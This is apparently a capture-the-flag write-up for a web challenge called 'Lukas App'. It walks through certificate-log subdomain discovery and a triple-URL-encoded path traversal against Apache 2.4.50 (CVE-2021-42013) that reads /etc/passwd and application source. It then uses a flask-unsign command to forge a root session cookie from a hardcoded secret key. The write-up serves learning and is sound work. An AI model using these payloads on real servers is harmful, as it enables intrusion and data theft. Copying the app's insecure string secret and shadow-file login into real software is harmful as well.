<h1>Lukas App</h1>

<h2>Description</h2>

<blockquote>
  <p>After the excellent success of the luca-app we now decided to build our own tracing apps. We still have some technical difficulties but you may still want to have a look: https://lukas-app.de. At least we managed to get the TLS certificates for all hosts!</p>
  
  <p>Hint 1: Read the challenge description carefully. There already is a big hint in it.</p>
  
  <p>Hint 2: There is only a tiny bit of guesswork involved, and it's not hard to find. A lot of teams already found it. Also again: Automated tooling like dirbuster or sqlmap will not help you with this challenge.</p>
  
  <p>Hint 3: We at Lukas App are proud to be running our software in the cloud. We don't even need to care about server updates or weird protocol headers anymore.</p>
</blockquote>

<h2>Solution</h2>

<p>The contents of https://lukas-app.de are not very interesting. It's only a static site, with a non-working captcha. The web challenges in this CTF don't involve any scanning and brute-forcing, so there's nothing else for us here.</p>

<p><img src="../../.gitbook/assets/Screenshot 2021-11-29 at 11.51.36 AM.png" alt="" /></p>

<h3>Certificate Search</h3>

<p>The description said "At least we managed to get the TLS certificates for all hosts!", and the hints point us in that direction, so I decided to do a <code>crt.sh</code> certificate search.</p>

<p><img src="../../.gitbook/assets/image (81) (1) (1).png" alt="" /></p>

<p>This indeed revealed two additional subdomains! <code>beta.lukas-app.de</code> is another web app. There's a login page, but not much else.</p>

<p><img src="../../.gitbook/assets/Screenshot 2021-11-29 at 11.57.41 AM.png" alt="" /></p>

<p>I noticed that the logo here is fetched from <code>https://cdn.lukas-app.de/static/logo.png</code>. But when visiting this URL, we are actually redirected to another domain: <code>https://cdn-eu-west.lukas-app.de/static/logo.png</code>.</p>

<h3>Path Traversal</h3>

<p>Looking at the response headers, I immediately noticed that we have hit the jackpot - this server, unlike the others, returned <code>Server: Apache/2.4.50 (Unix)</code>, which was vulnerable to a recent path traversal vulnerability (CVE-2021-42013)!</p>

<p>{% embed url="https://www.exploit-db.com/exploits/50406" %}</p>

<p>Using the usual payload (<code>.%%32%65</code>), however, gave us a 400 Bad Request. I think this was due to the server using both Nginx (which would have already performed one round of URL decoding) and Apache (which would then receive the URL-decoded path). To overcome this, I had to URL-encode the PoC payload again (a <em>triple</em> URL encoding by now!)</p>

<p>Now we get a different error (403 Forbidden) using <code>GET /cgi-bin/.../etc/passwd</code>.</p>

<p>I was stuck here for a while, until I came across some inspiration from <a href="https://twitter.com/__mn1__/status/1445655933242134530">Twitter</a>: instead of <code>/cgi-bin/</code> maybe the <code>/static/</code> path, where the logo is stored, is an <code>Alias</code> to some directory?</p>

<p><img src="../../.gitbook/assets/Screenshot 2021-11-29 at 12.09.16 PM.png" alt="" /></p>

<p>I finally got a working path traversal: <code>GET /static/%25%2532%2565%25%2532%2565%2F%25%2532%2565%25%2532%2565%2Fetc/passwd HTTP/2</code></p>

<p>I then read the Apache configuration file (at <code>/usr/local/apache2/conf/httpd.conf</code>), which confirmed my hypothesis. Interestingly, the <code>/static/</code> URL maps to <code>/app/static</code>. Could this be the same directory where the web app is stored?</p>

<p>```
...</p>

<p>Alias "/static" "/app/static"</p>

<p>...
```</p>

<p>Indeed, I was able to read the source code from <code>/app/app.py</code>.</p>

<p>```python</p>

<h1>!/usr/bin/env python3</h1>

<p>from flask import Flask, session, redirect, url<em>for, escape, request, render</em>template
import werkzeug.exceptions
import crypt
import secrets</p>

<p>app = Flask(<strong>name</strong>)
app.secret<em>key = "secrets.token</em>bytes(50)"</p>

<p>FLAG = open("/flag.txt").read()</p>

<p>@app.route("/")
def index():
    if "username" not in session:
        return redirect("/login?msg=Login+required")</p>

<pre><code>if session["username"] == "root":
    return "Hello, %s!&lt;br/&gt;\nHave a nice flag: %s" % (session["username"], FLAG)
else:
    return "Hello, %s!&lt;br/&gt;\nNo flags available for you."
</code></pre>

<p>@app.route("/robots.txt")
def robotstxt():
    return open("robots.txt").read()</p>

<p>@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "GET":
        return render_template("login.tpl", msg=request.args.get("msg", ""))</p>

<pre><code>username = request.form["username"]
password = request.form["password"]

# use system logins during beta phase, needs to be moved to database for production use!
users = dict(x.split(":")[:2] for x in open("/etc/shadow").readlines() if x.split(":")[1][0] != "!")
if username not in users:
    return redirect("/login?msg=Invalid+credentials")
if crypt.crypt(password, users[username]) != users[username]:
    return redirect("/login?msg=Invalid+credentials")

session["username"] = username
return redirect("/")
</code></pre>

<p>@app.errorhandler(werkzeug.exceptions.BadRequest)
def handle<em>bad</em>request(e):
    return "/app/app.py:app raised an exception:<br/>" + str(e), 400</p>

<p>if <strong>name</strong> == '<strong>main</strong>':
    app.run(host="0.0.0.0", port=80)
```</p>

<h3>Baking Cookies</h3>

<p>The final nail in the coffin came from the following programming error in the secret key (it's a string):</p>

<p><code>python
app.secret_key = "secrets.token_bytes(50)"
</code></p>

<p>We simply need to change our session <code>username</code> to <code>root</code>, in order to get the flag.</p>

<p>```python
@app.route("/")
def index():
    if "username" not in session:
        return redirect("/login?msg=Login+required")</p>

<pre><code>if session["username"] == "root":
    return "Hello, %s!&lt;br/&gt;\nHave a nice flag: %s" % (session["username"], FLAG)
else:
    return "Hello, %s!&lt;br/&gt;\nNo flags available for you."
</code></pre>

<p>```</p>

<p>Since the server uses client-side cookies, we can simply sign the Flask cookie with our desired username.</p>

<p><code>
$ flask-unsign --sign --cookie "{'username': 'root'}" --secret "secrets.token_bytes(50)"
eyJ1c2VybmFtZSI6InJvb3QifQ.YaORNg.qF6ApxeBVfgNfKnMi5j6FegPqSM
</code></p>

<p>Change the session cookie and get the flag!</p>

<p><code>
Hello, root!
Have a nice flag: CSR{%79%6f%75%20%63%61%6e%27%74%20%65%73%63%61%70%65%20%74%68%65%20%64%6f%75%62%6c%65%20%64%6f%74%73}
</code></p>
